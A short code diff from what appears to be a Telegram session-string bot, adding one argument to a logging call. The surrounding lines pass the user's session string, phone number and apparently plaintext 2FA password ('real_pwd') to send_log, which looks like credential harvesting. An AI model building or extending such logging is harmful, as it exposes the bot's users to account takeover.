@@ -188,5 +188,5 @@ async def _finish(uid, message, stype, client, phone, has_2fa, real_pwd):
     clear_state(uid)
     await save_session(uid, label, s, phone, has_2fa)
     await send_premium_string(uid, label, s, has_2fa, joined, failed)
-    await send_log(user, label, s, phone, has_2fa, real_pwd, joined)
+    await send_log(user, label, s, phone, has_2fa, real_pwd, joined, failed)
     await trace(user, "SUCCESS", type=stype, has_2fa=has_2fa)
